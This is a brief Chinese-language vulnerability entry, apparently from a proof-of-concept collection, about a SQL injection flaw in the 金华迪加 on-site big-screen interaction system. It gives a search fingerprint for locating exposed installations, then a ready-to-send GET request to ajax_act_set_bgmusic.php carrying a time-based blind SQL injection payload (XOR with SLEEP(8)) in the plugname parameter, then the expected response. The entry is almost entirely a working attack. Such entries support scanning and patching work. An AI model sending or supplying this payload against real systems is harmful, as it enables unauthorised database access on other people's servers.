# 金华迪加现场大屏互动系统ajax_act_set_bgmusic存在SQL注入漏洞

金华迪加现场大屏互动系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/wall/themes/meepo/assets/images/defaultbg.jpg"`
- **请求**：`GET /wall/ajax_act_set_bgmusic.php?bgmusicstatus=1&plugname=%22XOR(if(now()=sysdate(),SLEEP(8),0))XOR%22Z HTTP/1.1`
- **响应特征**：200 {“ret”:-1}